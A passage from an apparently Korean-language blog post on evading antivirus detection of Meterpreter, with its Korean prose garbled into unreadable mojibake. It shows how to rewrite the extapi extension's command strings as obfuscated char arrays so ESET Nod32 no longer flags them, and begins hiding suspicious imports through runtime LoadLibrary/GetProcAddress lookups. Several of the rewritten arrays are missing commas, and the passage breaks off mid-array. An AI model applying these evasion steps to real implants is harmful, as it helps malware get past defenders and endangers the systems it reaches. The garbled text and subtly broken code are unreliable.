ë³µì¡í•˜ê²Œ ë¶„ì„í•´ì•¼ í•œë‹¤.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreterì˜ ì½”ë“œ ë² ì´ìŠ¤ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„±ì€ <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>ì™€ ê°™ì€ íŒŒì¼ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">Command customCommands[] =&#123;    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...&#125;</code></pre><p>ì´ ë¬¸ìì—´ë“¤ì€ <code>ext_server_espia_x64.dll</code>ì˜ <code>.rdata</code> ì˜ì—­ì— í‰ë¬¸ìœ¼ë¡œ ì €ì¥ë˜ê³  <em>ESET Nod32</em>ì—ì„œ íƒì§€ëœë‹¤.</p><p>ì´ ë¬¸ìì—´ë“¤ì€ list initialzierì— ìœ„ì¹˜í•œ ë§¤í¬ë¡œì˜ ë§¤ê°œë³€ìˆ˜ì´ë‹¤. ëª©í‘œëŠ” ìë™ìœ¼ë¡œ ìœ„ì˜ ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì¬ì‘ì„±í•˜ëŠ” ê²ƒì´ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_PHxnGM7M0609[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;Command customCommands[] =&#123;    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR&#125;;</code></pre><h2 id="API-Import-ìˆ¨ê¸°ê¸°"><a href="#API-Import-ìˆ¨ê¸°ê¸°" class="headerlink" title="API Import ìˆ¨ê¸°ê¸°"></a>API Import ìˆ¨ê¸°ê¸°</h2><p>ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ export ëœ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ linkerê°€ <em>Import Address Table</em>(IAT)ì— ê¸°ë¡í•œë‹¤. í•¨ìˆ˜ ì´ë¦„ì€ ë°”ì´ë„ˆë¦¬ì—ì„œ í‰ë¬¸ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆê³  ì‹¤í–‰í•˜ì§€ ì•Šê³  ì •ì ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í•¨ìˆ˜ëª…ë“¤ì„ ìˆ¨ê¸°ê³  ì •ìƒì ì¸ ë°”ì´ë„ˆë¦¬ì— ì¡´ì¬í•˜ëŠ” ê²ƒë“¤ì€ ìœ ì§€í•˜ëŠ” ê²ƒì´ ì¢‹ë‹¤.</p><p>Meterpreterì˜ <em>kiwi</em> extensionì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>ì´ í•¨ìˆ˜ëŠ” <code>samlib.dll</code>ì—ì„œ export ë˜ë¯€ë¡œ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì—ëŠ” <code>samlib.dll</code>ê³¼ <code>SamEnumberateUsersInDomain</code> ë¬¸ìì—´ì´ í‘œì‹œëœë‹¤.</p><p>ì´ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ì‹¤í–‰ ì¤‘ì— <code>LoadLibrary/GetProcAddress</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ APIë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤. ì´ í•¨ìˆ˜ë“¤ì€ ë¬¸ìì—´ì„ ì¸ìë¡œ ì‚¬ìš©í•˜ë¯€ë¡œ ë‚œë…í™”ë¥¼ ì˜í•´ì•¼ í•œë‹¤. ë”°ë¼ì„œ ìœ„ì˜ ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì¬ì‘ì„±í•´ì•¼ í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span 